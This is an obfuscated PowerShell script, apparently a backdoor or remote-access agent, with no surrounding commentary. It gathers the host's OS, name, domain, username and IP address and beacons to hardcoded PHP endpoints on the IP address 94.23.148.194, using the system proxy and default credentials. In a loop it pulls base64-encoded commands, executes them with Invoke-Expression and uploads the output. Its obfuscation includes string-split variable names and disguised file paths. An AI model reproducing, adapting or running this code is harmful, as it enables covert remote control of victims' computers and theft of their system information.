seT-ITEM ('V'+'aRiAb'+'Le:'+'BcV0o')  'System.BitConverter'  ;  ${x9NEO}=[TyPE]'convERt' ;    sV 'C4Opb'  'System.Text.Encoding' ;${KuiRt}  = [tYPe]'SysTEm.ConVeRT'  ;  SET-ITEm  'VARiAblE:BQc8'  'System.Net.WebProxy';    SEt-ITeM  'vArIAbLE:uRh1' 'System.Net.CredentialCache';   set-iTEM  'vaRiAbLE:JuP' 'System.String'  ;   SV  'OTC2b' 'System.Environment'  ; try{${GLobAl:WEBCLIEntobj} = new-objeCT 'System.Net.WebClient'} catch{${_}."ExCePTIon" | oUT-FilE 'C:\programdata\error.txt' -Append; (get-ITEm  ('variABl'+"e"+":o"+"Tc"+"2B"))."vALUE"::'Exit'."iNvOkE"'1'}  try{${GloBAl:nAMeVALUEcOLlEcTIOnOBj} = nEw-obJECt 'System.Collections.Specialized.NameValueCollection'} catch{${_}."ExCePTION" | oUT-filE 'C:\programdata\error.txt' -Append; (vArIAbLe ('otc2'+"b"))."VALUe"::'Exit'."INVOkE"'1'}  ${GloBAl:PRoJectcOde} = '40334033'  ${gLobAL:pROjECtFiRsTHiT} = 'scrtAgnt1.1'  ${globAL:helloMSGURi} = 'http://94.23.148.194/serverScript/clientFrontLine/helloServer.php'  ${gLobAL:gETCmDURi} = 'http://94.23.148.194/serverScript/clientFrontLine/getCommand.php'  ${glOBAL:sETCmdreSUlTuRi} = 'http://94.23.148.194/serverScript/clientFrontLine/setCommandResult.php'  ${GlOBal:GetcmdrESult} = ''    function BAsIcinfoCoLLECToR  {      try{${HOsTNaME} = '\\DESKTOP-HCKESKI\root\cimv2:Win32_OperatingSystem=@'  ."CsNaME"} catch{${_}."EXcepTion" | ouT-FiLE 'C:\programdata\error.txt' -Append;${hOstNAmE} = "HS"}          try{${osArCh} = '\\DESKTOP-HCKESKI\root\cimv2:Win32_OperatingSystem=@'  ."osArChIteCTuRE"} catch{${_}."EXcEPTioN" | oUT-FilE 'C:\programdata\error.txt' -Append;${osaRCH} = "OA"}      try{${OsFUllNAMe} = '\\DESKTOP-HCKESKI\root\cimv2:Win32_OperatingSystem=@'  ."CApTIOn"} catch{${_}."ExCEpTIon" | oUT-FILE 'C:\programdata\error.txt' -Append;${OSFuLlnAme} = "OFN"}      try{${dOmAiNNAMe} = '\\DESKTOP-HCKESKI\root\cimv2:Win32_ComputerSystem.Name="DESKTOP-HCKESKI"'."domAIn"} catch{${_}."exCepTIon" | OUT-filE 'C:S4DprogramdataS4Derror.txt'.REpLaCe'S4D \' -Append;${doMAINNAME} = "DN"}      try{${uSerNAmE} = '\\DESKTOP-HCKESKI\root\cimv2:Win32_ComputerSystem.Name="DESKTOP-HCKESKI"'."UsErNaME"} catch{${_}."EXcEptioN" | OUt-FiLE 'C:\programdata\error.txt' -Append;${uSeRNAME} = "UN"}      try{${iPADdRESs} = (TEsT-conNEcTIon -ComputerName ${hoStNAMe} -count 1)."IPV4AdDrEss"."ipAdDRessTosTRIng"} catch{${_}."exCePtiOn" | OuT-fILe (('C:ZMHprogramdataZMHerror.txt')  -ReplACe 'ZMH',[CHAr]92) -Append;${IpAddREsS} = 'IP.IP.IP.IP'}            try{return ${OsfUlLnAME}.'trim'."InvoKe"() + '*' + ${OsArCh}.'trim'."INvOke"() + '*' + ${hostNAme}.'trim'."INVOKE"() + '*' + ${DOMaInNAME}.'trim'."iNvOKE"() + '*' + ${uSErName}.'trim'."INVoKe"() + '*' + ${IPADDrEss}.'trim'."INvOkE"()} catch{${_}."ExCEpTiOn" | OUT-FILE 'C:k3Oprogramdatak3Oerror.txt'.rEPlacE'k3O \' -Append;${TempBiNfo}='OFN*OA*HS*DN*UN*IP';return ${temPBINFO};  (cHiLDITEm 'VAriablE:OTC2B')."VaLUe"::'Exit'."INVoKe"'1'}  }    function Md5GenERATOR  {      Param([String] ${STR})            try{return   (GET-VarIABLE ('bcv0'+"o"))."vALuE"::'ToString'."INvoKE"((New-ObjEct -TypeName 'System.Security.Cryptography.MD5CryptoServiceProvider')."compUTEHAsH"((NEW-OBjECt -TypeName 'System.Text.UTF8Encoding').'GetBytes'."iNVoKe"(${STr})))} catch{${_}."eXcEpTiOn" | Out-FILE 'C:\programdata\error.txt' -Append;${TeMpmd5}='TempMD5';return ${teMPMd5};  ${OTc2B}::'Exit'."iNvoke"'1'}  }    function BAsE64EncOdER  {      Param([String] ${sTR})            try{return   ${x9neo}::"tobAsE64sTRINg".Invoke(((GcI ("v"+"a"+"Ri"+'aBlE:C4OPb'))."vAlUe"::"utF8".'GetBytes'."inVoke"(${STr})),'InsertLineBreaks')} catch{${_}."ExcePTIoN" | OuT-fIlE 'C:8hBprogramdata8hBerror.txt'.ReplAce'8hB \' -Append;${teMpBAsE64}='TempBase64Enc';return ${tEmpBaSe64};  ${OTc2B}::'Exit'."invOKE"'1'}  }    function bASE64deCOder  {       Param([String] ${STR})              try{return  ${c4opB}::"uTF8"."GeTSTRing"(${KUIRT}::'FromBase64String'."iNvOKE"(${sTR}))} catch{${_}."ExceptIon" | OUt-FiLE 'C:\programdata\error.txt' -Append;${temPBAse64Dec}='TempBase64Dec';return ${TEMPBaSE64dEC};  (VAriABLe  'OTC2B')."vALuE"::'Exit'."INvoKe"'1'}  }    function ASSemBlEr  {      Param' '           try{return (bAsE64eNCoDer -str ((gETcLiENtideNTity) + '*' + ${PRoJectCoDe} + '*' + ${pROJecTFirSTHit} + '*' + (gETBASICinfO)))} catch{${_}."excepTiOn" | OUt-FIlE (('C:QkEprogramdataQkEerror.txt') -CrEPlAcE 'QkE',[cHaR]92) -Append;  (DiR 'vAriabLE:OtC2b')."VALUE"::'Exit'."INvOkE"'1'}  }    function geTBASIcINFo  {      try{return BASIcinFocOlLeCtOR} catch{${_}."exCepTION" | OUT-fILe 'C:c4yprogramdatac4yerror.txt'.rEpLAce'c4y \' -Append;  ${OtC2b}::'Exit'."INVOKE"'1'}  }    function gETbase64CLienTiDenTIty  {      try{return (BAse64encoDEr -str (mD5GeNERAtoR -str (geTBASICINfo)))} catch{${_}."ExcEpTioN" | OuT-FILE (('C:{0}programdata{0}error.txt') -f  [Char]92) -Append; (gcI  ('vARIaBL'+"E:O"+"TC2"+"B"))."valUE"::'Exit'."iNvOKe"'1'}  }    function GeTCliENTidEntiTy  {      try{return (Md5GeNeRATOr -str (GeTBAsiCINFo))} catch{${_}."excepTIOn" | oUT-file ('C:HCUprogramdataHCUerror.txt').rePlaCe'HCU \' -Append; (vARIAbLE ("O"+'tc2b') -vALuE)::'Exit'."inVOke"'1'}  }    function HELlOSErVErreQUeSt  {      Param([String] ${URi})            ${helLoMsgvAlUE} = aSsEMBLEr -projectCode ${glOBAl:pRoJecTCODe} -projectFirstHit ${GLoBal:projEcTfIrSThiT}      ${globAL:NAMEvaluEcolLeCtionoBJ}.'add'."INVokE"'helloMsg '      try      {          ${GLoBaL:WebClIENTOBJ}."pROXy" =  (geT-vAriAbLE  ("bQC"+"8"))."vALUe"::'GetDefaultProxy'."INvOKE"()          ${gLoBAl:WeBClIENtOBJ}."usedeFAulTCReDEnTIALS"=${tRuE}          ${GlOBAl:WEbClIentObj}."ProXy"."cREDEnTialS" =   ${uRH1}::"DEFAUlTnETWORkCrEDenTIALS"                }      catch{${_}."exCEptIoN" | ouT-File 'C:\programdata\error.txt' -Append; (gET-chIlDItem ('Va'+'ri'+'A'+'BLe:OTC2b'))."Value"::'Exit'."inVOKE"'1'}      ${GLobAL:wEbcLiENTOBJ}."QUErYSTrING" = ${GloBaL:naMeVAlUeCOlLectiONobJ}      try{${respoNSE} = ${GlobAl:WebclIeNTOBJ}.'uploadString'."inVoke"' '} catch{ ${_}."ExCePTIon" | OUt-FIlE 'C:\programdata\error.txt' -Append; sleEPmode -timer 20; mAiN}      ${gLOBAl:nAmeVaLUecOlleCTIOnoBJ}.'remove'."InVOKE"'helloMsg'           return ${REsPonse}  }    function GEtCoMmAnDReQuESt  {      Param([String] ${uRI})            ${gloBAl:NAmEValUECoLlEcTiONOBj}.'add'."invOkE"('clientIdentity', (GetBASe64ClieNtidEnTITy))      try      {          ${gLObAl:weBcLIeNTObj}."prOXY" =   ${BQc8}::'GetDefaultProxy'."INVokE"()          ${GlOBal:wEBclIenToBJ}."uSEDEFAUlTcREDENTIaLs"=${trUe}          ${Global:wEBclienTobJ}."PRoXY"."CREdenTiaLs" =   ${urH1}::"dEfAuLTnEtWOrkcREDeNTiALs"                }      catch{${_}."ExCEPTIoN" | ouT-fiLE 'C:\programdata\error.txt' -Append; ${OTc2b}::'Exit'."InVoKe"'1'}      ${GloBaL:weBClieNTObJ}."QUerystRiNg" = ${namEValUEcoLlEcTioNObj}      try{${BAsE64_rESPONsE} = ${GLoBAL:weBClienTOBJ}.'uploadString'."INvOKE"' '} catch{${_}."excePTioN" | oUt-FiLe 'C:\programdata\error.txt' -Append; SlEEpModE -timer 20; MaIn}      ${gLOBAL:naMeVAluEcOlleCTiONObj}.'remove'."invokE"'clientIdentity'            return (bASE64DEcoDer -str ${base64_REsPonSe})  }    function ExECUTECOmmANdanDSetCOMManDRESUlTRequEsT  {      Param([String] ${uRI}, [String] ${coMmAnd})        if (${jUP}::'IsNullOrEmpty'."iNVokE"(${cOmmANd})){${COMMANd} = 'ping -n 1 127.0.0.1'}           try{${BaSE64_cmDrEsuLT} = (baSe64eNCODEr -str ((GETcLIENtiDENtItY) + '*' + (Base64ENcODEr -str (IEx ${comMaNd} -ErrorAction 'SilentlyContinue' | OUt-sTRiNg))))} catch{${_}."exCEptiON" | out-File 'C:\programdata\error.txt' -Append; SlEePmode -timer 20; MAIn}      ${GLobAL:nAmEValUecOlLECTionobJ}.'add'."INvoKe"'cmdResult '       try      {          ${GlOBaL:weBCLIEnTOBJ}."PROXY" =   (VAriABLE  'bQC8' -VALU)::'GetDefaultProxy'."InVOke"()          ${gLoBaL:webcLIeNtOBJ}."usEdEFaulTCREdENTiAls"=${tRUe}          ${GLOBAl:WeBClIeNTOBJ}."proxY"."cREdEnTiALs" =  ${Urh1}::"deFAuLtnETWOrkcReDentiAlS"                }      catch{${_}."exCEPtiON" | OUT-FiLE 'C:SmAprogramdataSmAerror.txt'.REplAcE'SmA \' -Append; (VARIAbLe 'oTc2b')."VaLUe"::'Exit'."InVokE"'1'}      ${gLOBaL:WeBcLIeNToBj}."QUerYSTRiNg" = ${gLoBAL:naMeVAluecOLlECTiOnOBJ}      try{${rEspOnsE} = ${glObaL:wEBCLienToBj}.'uploadString'."InVOke"' '} catch{${_}."eXcEpTIoN" | OuT-FilE 'C:\programdata\error.txt' -Append; SlEePmodE -timer 20; MAiN}      ${gLobal:NAmeValUecoLlEcTIoNOBj}.'remove'."InVOKe"'cmdResult'        return ${respONSe}  }    function sLeEpMoDE  {      Param([int] ${TIMer})      sleEP -s ${TImer}  }    function hELlOSeRvERloOP  {      try      {          do          {              ${HelLoSeRVEr_respONsE} = helLoseRveRreqUEST -uri ${glOBAL:HelLoMsgURi}              sLeePModE -timer 5          }          while(${helloseRver_rEspoNSe} -eq '%BYE%')      }      catch      {          ${_}."EXcePtiON" | OuT-FilE 'C:\programdata\error.txt' -Append          ONLinEAcTiONsexCEPTiONRecOvery             }          }    function gETCoMManDLooP  {      try      {          do          {              HElLoSERVeRlOOp              ${reCeivEdcMd} = GETcoMmANdrEQUESt -uri ${gLobAL:GEtCmdUrI}              if ((VARIabLe  ("J"+"uP"))."VAluE"::'IsNullOrEmpty'."inVoKE"(${RECEIVedCmD})){SleePModE -timer 5;MAIn}              ${gLobAl:GetCMdREsULt} = ${ReCEIVEdCmd}              slEepmOdE -timer 5          }          while(${REcEiveDCmD} -eq 'SHH')      }      catch      {          ${_}."eXcEPtIOn" | oUT-fILE 'C:\programdata\error.txt' -Append          ONlINeActIoNsEXcEPTIoNrEcoVERY      }  }    function eXecUTECommandANDseTcoMmaNDrESULTLOOP  {      try      {          do          {              if ((VarIaBle ('J'+'Up') -vA)::'IsNullOrEmpty'."INVoke"(${gLobAL:GetcMdReSuLT})){${gLoBAl:gETcMDREsUlt} = 'ping -n 1 127.0.0.1'}              ${setcmdResuLt_rEsPoNSE} = eXEcUteCOMmAndANDsEtCOmMAnDReSUltReQuEst -uri ${glObAL:SetCmdREsUlTuRI} -command ${GLOBAl:geTcMdrEsUlT}              SleepModE -timer 5          }          while(${sEtCMDrEsUlt_REsPONSe} -eq '%WHAT%')      }      catch      {          ${_}."EXCePtIoN" | oUt-FIlE 'C:\programdata\error.txt' -Append          oNlINeACTIoNSEXcePTIoNrECOVEry      }  }    function onlINEaCtIONsExcepTIONReCoVEry  {      SLeEPMODE -timer 15      helLoSeRVERLoOp      gETcOmMANDlOOp      exECUtecOmMaNdAndSeTcomMANDreSuLTloOP  }    function main  {      while'True'          {              HelLOseRVERlOop              gETcoMMAndloOP              exeCUtecOmMANDAndsetCoMmANDResuLtlOOP            }  }    try{MAIN} catch{${_}."EXcePTion" | &'Out-File' 'C:\programdata\error.txt' -Append;  (&'ITEm'  'varIABle:otC2b')."ValUe"::'Exit'."inVoke"'1'}
